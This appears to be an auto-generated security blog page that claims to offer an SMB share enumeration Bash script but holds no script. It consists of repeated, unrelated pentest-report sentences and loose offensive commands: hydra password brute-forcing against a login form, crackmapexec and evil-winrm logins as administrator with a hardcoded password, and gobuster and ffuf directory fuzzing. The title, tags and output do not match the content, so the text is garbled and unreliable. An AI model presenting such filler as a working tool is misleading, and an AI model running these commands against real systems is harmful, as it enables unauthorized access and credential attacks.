---
TitleSEO: "SMB Share Enumeration Script in Bash | ZureFX"
TitlePost: "SMB Share Enumeration Script — Bash"
Author: "ZureFX"
Description: "A Bash script for smb share enumeration script. Built for security research and automation."
Keywords: "go, script, bash, python, scanner"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-872.html"
URL_IMAGES: ""
Date: "2024-09-28"
Tags: "Go, Script, Bash, Python, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-872"
Permalink: "/scripting/script-smb-share-enumeration-script-872.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `pwncat`
- `nmap`
- `metasploit`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.22.51 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.112.117.103 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.32.182.181/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.36.164.90/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.76.62.163 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.113.126.199/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.141.182/FUZZ
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.193.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 22.49s
```
